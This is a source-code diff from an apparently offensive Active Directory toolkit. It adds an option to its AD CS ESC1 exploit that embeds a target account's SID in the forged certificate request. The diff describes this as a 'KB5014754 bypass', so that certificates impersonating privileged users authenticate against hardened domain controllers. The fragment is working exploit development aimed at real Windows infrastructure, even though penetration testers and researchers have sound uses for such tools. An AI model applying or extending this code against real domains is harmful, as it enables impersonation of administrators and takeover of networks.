@@ -41,6 +41,14 @@ pub(crate) struct Esc1Args {
     /// KDC `host[:port]` for --pkinit (defaults to --host)
     #[arg(long)]
     pub kdc: Option<String>,
+    /// **1.5.2 KB5014754 bypass.** Target user's objectSid (e.g. `S-1-5-21-…-500`) — the CSR
+    /// will carry the `szOID_NTDS_CA_SECURITY_EXT` strong-mapping extension so the issued
+    /// cert PKINITs cleanly against Full-Enforcement KDCs (Windows Server 2019+/KB5014754,
+    /// mandatory since Feb 2025). Without this, PKINIT on a modern DC fails with
+    /// `KDC_ERR_CERTIFICATE_MISMATCH`. Look the SID up once via `enum ldap-info --user`
+    /// or `enum samr --user` and reuse it.
+    #[arg(long, value_name = "SID")]
+    pub sid: Option<String>,
 }
 
 /// **1.4.8-A WS-ESC1-EXPLOIT.** AD CS ESC1: build a PKCS#10 CSR whose SAN is
@@ -83,16 +91,22 @@ async fn esc1_impl(a: Esc1Args, checklist: &mut crate::ui::StageChecklist) -> Re
     use smb2_client::SmbClient;
 
     let subject = a.upn.split('@').next().unwrap_or("adhammer");
-    let csr = adhammer_kerberos::csr::build_csr(subject, Some(&a.upn))?;
+    let csr =
+        adhammer_kerberos::csr::build_csr_with_sid_ext(subject, Some(&a.upn), a.sid.as_deref())?;
     let key_path = format!("{}.key.pem", a.out);
     adhammer_core::write_secret_artifact(
         std::path::Path::new(&key_path),
         adhammer_core::SecretArtifact::PrivateKey,
         csr.key_pem.as_bytes(),
     )?;
+    let sid_note = a
+        .sid
+        .as_deref()
+        .map(|s| format!(", SID-ext={s} (KB5014754)"))
+        .unwrap_or_default();
     checklist.record_ok(
         "build CSR (UPN SAN)",
-        format!("subject={subject}, SAN upn={}", a.upn),
+        format!("subject={subject}, SAN upn={}{sid_note}", a.upn),
     );
     eprintln!("[*] CSR built (subject CN={subject}, SAN upn={})", a.upn);
 
